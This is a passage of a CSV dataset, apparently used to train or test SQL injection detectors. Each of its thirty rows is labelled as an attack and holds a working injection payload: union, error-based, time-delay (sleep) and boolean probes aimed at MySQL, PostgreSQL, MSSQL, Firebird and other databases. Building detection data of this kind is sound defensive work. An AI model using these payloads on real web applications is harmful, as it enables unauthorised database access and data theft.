row_index,payload_norm,label,sqli_type_hint
5430,"-1964' ) as ihsp where 6379 = 6379 or elt ( 6945 = 6165,6165 ) --",1,
5431,"1%' union all select null,null,null--",1,
5432,"1%"" ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( ""%"" = """,1,
5433,"-8133' ) union all select 6417,6417,6417,6417,6417,6417,6417,6417--",1,
5434,"-5396'|| ( select 'fjhd' from dual where 4019 = 4019 union all select 4019,4019,4019,4019#",1,
5435,"1 ) as wuio where 5312 = 5312 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
5436,"1 ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( 4048 = 4048",1,
5437,"1"" ) where 3393 = 3393 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
5438,"1' ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( 'ozan' = 'ozan",1,
5439,"1%"" ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ( ""%"" = """,1,
5440,"1"" ) ) as rign where 1604 = 1604 and 3661 = 3054--",1,
5441,"1' ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( 'ogpg' = 'ogpg",1,
5442,-6813 ) ) ) or 6872 = 6872 and ( ( ( 7304 = 7304,1,
5443,-1876%' ) union all select 6463--,1,
5444,-1908' ) ) ) union all select 7665#,1,
5445,"1 ) as wvpl where 9791 = 9791 and make_set ( 3491 = 9067,9067 ) --",1,
5446,1%' ) ) and 7533 = 7533 and ( ( '%' = ',1,
5447,"-9858"" or 8592 = 8553",1,
5448,1 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) # yoch,1,
5449,-3862' ) or 9323 = 9323#,1,
5450,1 ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 3505 = 3505,1,
5451,"1 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) # utdm",1,
5452,"1' ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 'cylu' = 'cylu",1,
5453,"1 ) as tjwa where 1173 = 1173 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",1,
5454,"-2028%' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( '%' = '",1,
5455,"1"" ) ) as jrld where 3488 = 3488",1,
5456,"1"" ) ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
5457,"-6659' ) where 1256 = 1256 union all select 1256,1256--",1,
5458,"-1598 ) ) ) union all select 9418,9418,9418,9418,9418,9418,9418#",1,
5459,"1'|| ( select 'mzsy' where 4940 = 4940 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
